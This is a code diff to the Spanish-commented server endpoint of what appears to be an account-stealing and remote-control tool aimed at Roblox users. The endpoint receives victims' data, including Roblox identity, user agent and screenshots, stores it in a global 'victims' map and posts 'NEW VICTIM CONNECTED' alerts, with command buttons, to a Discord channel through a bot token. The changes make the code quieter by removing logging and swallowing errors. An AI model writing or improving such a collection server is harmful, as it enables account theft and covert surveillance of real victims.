@@ -1,12 +1,14 @@
-// api/log.js
+// api/log.js - VERSIÓN CON CORS CORREGIDO
 export default async function handler(req, res) {
-    // Configurar CORS
+    // Configurar CORS para TODAS las respuestas
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    res.setHeader('Access-Control-Max-Age', '86400');
 
+    // Manejar preflight OPTIONS correctamente
     if (req.method === 'OPTIONS') {
-        return res.status(200).end();
+        return res.status(204).end();
     }
 
     if (req.method !== 'POST') {
@@ -14,9 +16,8 @@ export default async function handler(req, res) {
     }
 
     const data = req.body;
-    console.log('📥 Datos recibidos:', JSON.stringify(data, null, 2));
 
-    // Si es un tipo especial (resultado de una acción), reenviar a Discord
+    // Manejar captura de pantalla
     if (data.type === 'screenshot') {
         try {
             const base64Data = data.image.split(',')[1];
@@ -33,12 +34,11 @@ export default async function handler(req, res) {
                 headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` },
                 body: formData
             });
-        } catch (error) {
-            console.error('Error procesando captura:', error);
-        }
+        } catch (error) {}
         return res.status(200).json({ status: 'ok' });
     }
 
+    // Manejar limpieza
     if (data.type === 'cleanup') {
         try {
             await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
@@ -51,20 +51,13 @@ export default async function handler(req, res) {
                     content: `🧹 **DATOS LOCALES ELIMINADOS**\nUsuario: ${data.userId || 'Desconocido'}\nEstado: ${data.message || 'Limpieza completada'}`
                 })
             });
-        } catch (error) {
-            console.error('Error enviando confirmación de limpieza:', error);
-        }
+        } catch (error) {}
         return res.status(200).json({ status: 'ok' });
     }
 
-    // ============================================================
-    // 🔥 PARTE MODIFICADA: Guardar datos de la víctima correctamente
-    // ============================================================
-    
-    // Generar un identificador único para la víctima
+    // Guardar datos de la víctima
     const userId = data.roblox?.userId || `anon_${Date.now()}`;
 
-    // Guardar TODOS los datos de la víctima en memoria global
     if (!global.victims) global.victims = new Map();
     global.victims.set(userId, {
         roblox: data.roblox || {},
@@ -75,14 +68,10 @@ export default async function handler(req, res) {
         userAgent: data.userAgent || ''
     });
 
-    // ============================================================
-    // FIN DE LA PARTE MODIFICADA
-    // ============================================================
-
-    // Preparar embed con el FORMATO EXACTO que pediste
+    // Preparar embed
     const embed = {
         title: '🔔 ¡NUEVA VÍCTIMA CONECTADA!',
-        color: 0x9b59b6, // Morado
+        color: 0x9b59b6,
         fields: [
             {
                 name: '📌 PRINCIPAL',
@@ -143,21 +132,21 @@ export default async function handler(req, res) {
         footer: { text: `ID: ${userId}` }
     };
 
-    // Crear botones con los estilos que pediste
+    // Botones
     const components = [
         {
             type: 1,
             components: [
                 {
                     type: 2,
-                    style: 1, // Azul
+                    style: 1,
                     label: 'DISCORD',
                     custom_id: `discord_${userId}`,
                     emoji: { name: '🔵' }
                 },
                 {
                     type: 2,
-                    style: 1, // Azul
+                    style: 1,
                     label: 'ROBLOX',
                     custom_id: `roblox_${userId}`,
                     emoji: { name: '🔴' }
@@ -169,7 +158,7 @@ export default async function handler(req, res) {
             components: [
                 {
                     type: 2,
-                    style: 2, // Gris
+                    style: 2,
                     label: 'COMANDOS',
                     custom_id: `comandos_${userId}`,
                     emoji: { name: '⚫' }
@@ -178,37 +167,35 @@ export default async function handler(req, res) {
         }
     ];
 
-    // Enviar mensaje a Discord
+    // Enviar a Discord
     const token = process.env.DISCORD_BOT_TOKEN;
     const channelId = process.env.DISCORD_CHANNEL_ID;
 
     if (!token || !channelId) {
-        return res.status(500).json({ error: 'Bot token or channel ID not configured' });
+        return res.status(500).json({ error: 'Config error' });
     }
 
     try {
-    const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-        method: 'POST',
-        headers: {
-            'Authorization': `Bot ${token}`,
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            content: '||@everyone||\n\nSelecciona una opcion:',
-            embeds: [embed],
-            components: components
-        })
-    });
+        const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Bot ${token}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: '||@everyone||\n\nSelecciona una opcion:',
+                embeds: [embed],
+                components: components
+            })
+        });
 
-    if (!response.ok) {
-        return res.status(500).json({ error: 'Error sending to Discord' });
+        if (!response.ok) {
+            return res.status(500).json({ error: 'Discord error' });
+        }
+
+        res.status(200).json({ status: 'ok', userId: userId });
+        
+    } catch (error) {
+        res.status(500).json({ error: 'Server error' });
     }
-
-    res.status(200).json({ status: 'ok', userId: userId });
-    
-} catch (error) {
-    res.status(500).json({ error: 'Internal server error' });
 }
-        
-
-        
